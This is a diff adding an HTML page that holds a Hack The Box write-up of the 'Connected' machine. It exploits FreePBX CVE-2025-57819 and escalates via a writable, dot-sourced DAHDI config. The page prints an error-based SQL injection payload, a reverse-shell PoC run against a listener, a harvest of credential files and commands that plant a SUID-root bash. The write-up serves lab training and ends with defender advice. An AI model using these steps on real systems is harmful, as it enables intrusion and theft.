+    <span class="md-ellipsis">
+      
+        Foothold — CVE-2025-57819
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold — CVE-2025-57819">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-bug-is" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the bug is
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-it-by-hand" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Confirming it by hand
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#popping-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Popping the shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stabilising-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stabilising the shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-parade-of-dead-ends" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The parade of dead ends
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#harvesting-credentials-worth-doing-anyway" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Harvesting credentials (worth doing anyway)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-intended-path-incron-a-dot-sourced-config" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The intended path — incron + a dot-sourced config
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -4060,6 +4551,64 @@
   
 
 
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../overview/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../overview/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    HTB
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
               
               <article class="md-content__inner md-typeset">
                 
@@ -4067,9 +4616,310 @@
 
 
 
-  <h1>Hack the Box</h1>
+<h1 id="connected">Connected</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>OS</strong></td>
+<td>Linux (CentOS 7)</td>
+</tr>
+<tr>
+<td><strong>CVE</strong></td>
+<td>CVE-2025-57819 (FreePBX pre-auth SQLi → RCE)</td>
+</tr>
+<tr>
+<td><strong>Focus</strong></td>
+<td>Version fingerprinting + reading the <em>intended</em> root path past the decoys</td>
+</tr>
+</tbody>
+</table>
+<p>Connected is a box about knowing exactly what you're looking at.
+The foothold is a clean, current CVE against a version-pinned FreePBX install — identify the product and version precisely and the exploit almost hands itself to you.
+The privilege escalation is the opposite kind of lesson: it is buried under a pile of tempting dead ends. PwnKit is present, <code>sudo</code> looks vulnerable, <code>fwconsole</code> is world-writable — and none of them are the way in. Every one of those is patched, guarded, or a deliberate decoy.</p>
+<p>The real path is quieter: an <code>incron</code> watcher that lets a low-privileged user trigger a root action, and a root init script that <em>dot-sources</em> a config file the <code>asterisk</code> user can write. That's the whole box in one sentence — the danger was never the flashy CVEs, it was a single writable file that gets read into root's shell.</p>
+<hr />
+<h2 id="setup">Setup</h2>
+<p>HTB Pawnbox on the VPN, same network as the target.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Target</strong></td>
+<td><code>10.129.245.100</code> → <code>connected.htb</code></td>
+</tr>
+<tr>
+<td><strong>Attacker</strong></td>
+<td>pawnbox — <code>10.10.14.184</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="full-port-sweep">Full port sweep</h3>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-T4<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.129.245.100
+</code></pre></div>
+<p>Three ports open, everything else filtered:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https</td>
+</tr>
+</tbody>
+</table>
+<p>Two web ports and an SSH with no creds yet — this is a web engagement.</p>
+<h3 id="version-default-scripts">Version + default scripts</h3>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,80,443<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.129.245.100
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>OpenSSH 7.4</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>Apache 2.4.6 (CentOS), OpenSSL 1.0.2k-fips, <strong>PHP 7.4.16</strong></td>
+</tr>
+<tr>
+<td>443</td>
+<td>ssl/http</td>
+<td>same stack; cert <code>CN=pbxconnect, emailAddress=root@pbxconnect</code></td>
+</tr>
+</tbody>
+</table>
+<p>Port 80 redirects to <code>http://connected.htb/</code>, and the TLS cert on 443 names <code>pbxconnect</code>. The box tells you its own hostnames — no guessing needed. Add them:</p>
+<div class="highlight"><pre><span></span><code>10.129.245.100  connected.htb pbxconnect pbxconnect.htb
+</code></pre></div>
+<h3 id="walking-the-app">Walking the app</h3>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sI<span class="w"> </span>http://connected.htb<span class="w">            </span><span class="c1"># 302 -&gt; /admin</span>
+curl<span class="w"> </span>-sI<span class="w"> </span>http://connected.htb/admin/<span class="w">     </span><span class="c1"># 302 -&gt; config.php</span>
+curl<span class="w"> </span>-sI<span class="w"> </span>http://connected.htb/admin/config.php<span class="w">   </span><span class="c1"># 200, sets PHPSESSID + lang=en_US</span>
+</code></pre></div>
+<p>The app auto-loads an admin console at <code>/admin/config.php</code>. The <code>lang</code> cookie and PBX theming are enough to know this is a phone system — now pin the exact software and version.</p>
+<h3 id="fingerprint-freepbx-160407">Fingerprint — FreePBX 16.0.40.7</h3>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>http://connected.htb/admin/config.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">&#39;freepbx|version|copyright|login&#39;</span>
+</code></pre></div>
+<p>Confirmed two independent ways:</p>
+<ul>
+<li>Footer: <em>"FreePBX 16.0.40.7 is licensed under the GPL"</em></li>
+<li>Every asset carries <code>?load_version=16.0.40.7</code></li>
+</ul>
+<p>So: <strong>FreePBX 16.0.40.7</strong> (Sangoma) on PHP 7.4.16 / Apache 2.4.6 (CentOS). A login form sits at <code>/admin/config.php</code>, and the nav exposes extra modules (ISymphony panel, UCP, Operator Panel). With an exact product and version, the next move is obvious — look up what's public for <em>this</em> build.</p>
+<div class="admonition tip">
+<p class="admonition-title">The habit that matters here</p>
+<p>Fingerprinting to the patch version is the whole game on a box like this. "FreePBX" gets you nowhere; "FreePBX 16.0.40.7" maps straight to a CVE. Never stop at the product name when the version is sitting in the page source.</p>
+</div>
+<hr />
+<h2 id="foothold-cve-2025-57819">Foothold — CVE-2025-57819</h2>
+<p>FreePBX 16.0.40.7 (released early 2024) sits well below the fixed <code>endpoint</code> module version (16.0.89), so it's vulnerable to <strong>CVE-2025-57819</strong> — CVSS 9.8, and in CISA's Known Exploited Vulnerabilities catalogue after being exploited in the wild from August 2025.</p>
+<h3 id="what-the-bug-is">What the bug is</h3>
+<p>The chain is an <strong>authentication bypass</strong> stacked on a <strong>SQL injection</strong>:</p>
+<ul>
+<li>The <code>endpoint</code> module's ajax handler skips the normal auth check, so it processes input <strong>unauthenticated</strong>.</li>
+<li>That same handler concatenates the <code>brand</code> parameter straight into a SQL query — error-based injection, and because it allows <strong>stacked queries</strong>, an attacker can <em>write</em> to the database, not just read.</li>
+</ul>
+<p>The write primitive is what turns SQLi into RCE: inject a row into FreePBX's <code>cron_jobs</code> table, and the built-in cron runner executes it as a shell command within a minute or two.</p>
+<h3 id="confirming-it-by-hand">Confirming it by hand</h3>
+<p>First, prove the module processes input without auth — a malformed request throws an application error from deep inside the module:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;error&quot;</span><span class="p">:{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot;Trying to access array offset on value of type bool&quot;</span><span class="p">,</span>
+<span class="w"> </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="s2">&quot;/var/www/html/admin/modules/endpoint/views/model.php&quot;</span><span class="p">,</span><span class="nt">&quot;line&quot;</span><span class="p">:</span><span class="mi">144</span><span class="p">}}</span>
+</code></pre></div>
+<p>Then confirm the injection with a classic error-based <code>extractvalue</code> leak of the current DB user:</p>
+<div class="highlight"><pre><span></span><code>brand=1&#39; AND extractvalue(1,concat(0x7e,(SELECT current_user())))-- -
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;error&quot;</span><span class="p">:{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot;XPATH syntax error: &#39;~freepbxuser@localhost&#39;&quot;</span><span class="p">}}</span>
+</code></pre></div>
+<p>Injection confirmed, DB user is <code>freepbxuser@localhost</code>, web root is <code>/var/www/html</code>.</p>
+<h3 id="popping-the-shell">Popping the shell</h3>
+<p>A listener on the attack box, then the public PoC (which automates the <code>cron_jobs</code> write):</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># pawnbox — terminal 1</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
 
-
+<span class="c1"># pawnbox — terminal 2</span>
+git<span class="w"> </span>clone<span class="w"> </span>https://github.com/K3ysTr0K3R/CVE-2025-57819
+<span class="nb">cd</span><span class="w"> </span>CVE-2025-57819
+python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://connected.htb<span class="w"> </span>--lhost<span class="w"> </span><span class="m">10</span>.10.14.184<span class="w"> </span>--lport<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>[+] Exploit path confirmed!
+[*] Injecting payload into cron schedule...
+[+] Payload planted successfully
+[*] Awaiting trigger activation (cron will fire within ~60 seconds)...
+</code></pre></div>
+<p>Cron fired, the shell came back as <strong><code>asterisk</code></strong>.</p>
+<div class="highlight"><pre><span></span><code>[asterisk@connected ~]$ cat user.txt
+[redacted]
+</code></pre></div>
+<p><strong>User flag captured.</strong></p>
+<hr />
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>This is where the box earns its time. The shell as <code>asterisk</code> has no extra groups, no sudo rights, and a long line of tempting-but-wrong root paths in front of it.</p>
+<h3 id="stabilising-the-shell">Stabilising the shell</h3>
+<p>There's <strong>no <code>python3</code></strong> on the box, so the usual <code>pty.spawn</code> trick is out. <code>script</code> does the job:</p>
+<div class="highlight"><pre><span></span><code>script<span class="w"> </span>-qc<span class="w"> </span>/bin/bash<span class="w"> </span>/dev/null
+</code></pre></div>
+<h3 id="the-parade-of-dead-ends">The parade of dead ends</h3>
+<p>Being honest about what <em>didn't</em> work, because the point of this box is learning to rule things out fast:</p>
+<table>
+<thead>
+<tr>
+<th>Lead</th>
+<th>Why it failed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>sudo -l</code> / <code>su root</code></strong></td>
+<td>No NOPASSWD rule; a reverse shell can't feed <code>su</code>'s controlling-terminal password prompt. Solved the TTY problem by writing my own SSH key into <code>asterisk</code>'s <code>authorized_keys</code> and logging in for real — but every harvested password was rejected for <code>root</code>.</td>
+</tr>
+<tr>
+<td><strong><code>z001-updates.sh</code> cron</strong></td>
+<td>Root runs it nightly via <code>/etc/cron.d/cron-updates</code>, but the script is root-owned, sources nothing writable, and its privileged branch is guarded by a <code>uid != 0 &amp;&amp; return</code>. No hijack.</td>
+</tr>
+<tr>
+<td><strong>PwnKit (CVE-2021-4034)</strong></td>
+<td><code>pkexec</code> is SUID and present, but the exploit only spat out the <code>PWNKIT</code> gconv error and dropped no shell. Polkit is <strong>patched</strong> (SELinux is <em>Disabled</em> here, so it wasn't that).</td>
+</tr>
+<tr>
+<td><strong>Baron Samedit (CVE-2021-3156)</strong></td>
+<td><code>sudo --version</code> reports <strong>1.8.23</strong>, which <em>looks</em> vulnerable — but the exploit just printed <code>usage: sudoedit</code>. CentOS <strong>backports the fix without bumping the version string</strong>. The version number is a red herring.</td>
+</tr>
+<tr>
+<td><strong>Redis / MongoDB / Let's Chat / <code>fwconsole</code></strong></td>
+<td>Redis runs as <code>redis</code> not root; Mongo's <code>letschat</code> DB is empty; <code>letschat.service</code> is masked and 0 bytes; and world-writable <code>/usr/sbin/fwconsole</code> is a <strong>decoy</strong> — its caller signature-checks the binary before running it.</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">The Baron Samedit lesson</p>
+<p>On RHEL/CentOS, never trust the <code>sudo --version</code> string alone. Confirm exploitability with the canonical crash test and the package changelog:</p>
+<div class="highlight"><pre><span></span><code>sudoedit<span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;\&#39;</span><span class="w"> </span><span class="k">$(</span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;print &quot;A&quot; x 1000&#39;</span><span class="k">)</span><span class="w">   </span><span class="c1"># patched -&gt; &quot;usage:&quot;, vuln -&gt; crash</span>
+rpm<span class="w"> </span>-q<span class="w"> </span>--changelog<span class="w"> </span>sudo<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">&#39;3156|Baron&#39;</span><span class="w"> </span><span class="c1"># any hit = backported fix present</span>
+</code></pre></div>
+</div>
+<h3 id="harvesting-credentials-worth-doing-anyway">Harvesting credentials (worth doing anyway)</h3>
+<p>FreePBX keeps its DB and manager passwords in world-readable config files — always worth collecting even when they don't get you root:</p>
+<table>
+<thead>
+<tr>
+<th>Credential</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL <code>freepbxuser</code></td>
+<td><code>/etc/freepbx.conf</code> (<code>AMPDBPASS</code>)</td>
+</tr>
+<tr>
+<td>Asterisk Manager user/pass</td>
+<td><code>/etc/amportal.conf</code> (<code>AMPMGRUSER</code> / <code>AMPMGRPASS</code>)</td>
+</tr>
+<tr>
+<td>ARI user/pass</td>
+<td><code>/etc/amportal.conf</code></td>
+</tr>
+<tr>
+<td>PHP console password (human-set)</td>
+<td><code>/etc/amportal.conf</code> (<code>PHP_CONSOLE_PASSWORD</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>The MySQL creds do open the database — dumping <code>ampusers</code> yields the FreePBX web-panel admin and a crackable SHA1 — but that's the <em>web GUI</em> login, not a system account. A useful side-quest, not the root path.</p>
+<h3 id="the-intended-path-incron-a-dot-sourced-config">The intended path — incron + a dot-sourced config</h3>
+<p>The actual escalation is a trust chain that ends in a file <code>asterisk</code> can write:</p>
+<ol>
+<li><strong><code>incrond</code></strong> watches <code>/var/spool/asterisk/sysadmin/</code>. Dropping a file named <code>dahdi_restart</code> there makes <strong>root</strong> run <code>/usr/sbin/sysadmin_dahdi_restart</code>.</li>
+<li>That helper calls <code>/etc/init.d/dahdi restart</code>.</li>
+<li><code>/etc/init.d/dahdi</code> <strong>dot-sources</strong> its config —
+   <code>[ -r /etc/dahdi/init.conf ] &amp;&amp; . /etc/dahdi/init.conf</code> —
+   which runs the file's contents <em>inline in root's shell</em>, with <strong>no signature check</strong> (unlike the <code>fwconsole</code> decoy).</li>
+<li><code>/etc/dahdi/init.conf</code> is <code>-rw-r--r-- asterisk asterisk</code> — <strong>writable by us.</strong></li>
+</ol>
+<p>So: write a command into that config, trigger the watcher, and root executes it. Verify the chain first:</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;init.conf&#39;</span><span class="w"> </span>/etc/init.d/dahdi<span class="w">   </span><span class="c1"># -&gt; . /etc/dahdi/init.conf</span>
+ls<span class="w"> </span>-l<span class="w"> </span>/etc/dahdi/init.conf<span class="w">              </span><span class="c1"># -&gt; writable by asterisk</span>
+</code></pre></div>
+<p>Then have root make a copy of <code>bash</code> SUID-root:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/dahdi/init.conf
+touch<span class="w"> </span>/var/spool/asterisk/sysadmin/dahdi_restart
+<span class="c1"># wait ~25s for the watcher + service restart</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/home/asterisk/pwn1<span class="w">        </span><span class="c1"># -rwsr-xr-x root root</span>
+/home/asterisk/pwn1<span class="w"> </span>-p<span class="w">            </span><span class="c1"># -p preserves euid=0</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code># id
+uid=999(asterisk) euid=0(root) ...
+# cat /root/root.txt
+[redacted]
+</code></pre></div>
+<p><strong>Root flag captured. Box complete.</strong></p>
+<p>Cleanup: <code>sed -i '/pwn1/d' /etc/dahdi/init.conf</code> and <code>rm /home/asterisk/pwn1</code>.</p>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>user</td>
+<td><code>[redacted]</code></td>
+</tr>
+<tr>
+<td>root</td>
+<td><code>[redacted]</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<div class="admonition example">
+<p class="admonition-title">Conclusion</p>
+<p>The foothold rewards precision. FreePBX print its exact version into every page it serves, and 16.0.40.7 maps directly to CVE-2025-57819 — a pre-auth SQL injection whose stacked-query write turns into RCE through the product's own cron table. There was no brute force, no credential guessing, no lucky directory: identify the build, read the advisory, run the PoC. The lesson is upstream of the exploit — stopping at "it's FreePBX" instead of pinning the patch version would have left the whole box invisible.</p>
+<p>The privilege escalation is a study in resisting the obvious. Every loud, well-known local root — PwnKit, Baron Samedit, a world-writable root binary — is present <em>and</em> neutralised: polkit patched, sudo fixed by a silent backport, <code>fwconsole</code> guarded by a signature check. Burning time on those is the trap. Baron Samedit is the sharpest reminder: <code>sudo --version</code> said 1.8.23 and lied, because RHEL patches without bumping the string. On those distros, a crash test and <code>rpm --changelog</code> are the only honest confirmation.</p>
+<p>The real path is small and quiet: a service watches a spool directory a low user can write to, and a root init script dot-sources a config that same user owns. No memory corruption, no CVE — just a writable file that ends up executed as root. That is the more common shape of real-world Linux privesc than any headline exploit.</p>
+<p>Defender takeaways: patch internet-facing PBX software promptly — CVE-2025-57819 was in the KEV catalogue and exploited in the wild before this box existed. Config files holding DB and manager passwords should not be world-readable. And the root cause of the escalation is an ownership mistake: a config file dot-sourced by a <strong>root</strong> init script must never be writable by a service account. Audit what your privileged init scripts and cron jobs read, and who can write to it.</p>
+</div>
 
 
 
@@ -4103,6 +4953,44 @@
       
         <footer class="md-footer">
   
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../devel/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Devel">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Devel
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../thm/overview/" class="md-footer__link md-footer__link--next" aria-label="Next: Overview">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Overview
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
     
   
   <div class="md-footer-meta md-typeset">
@@ -4143,10 +5031,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.top", "navigation.footer", "search.suggest"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.top", "navigation.footer", "search.suggest"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
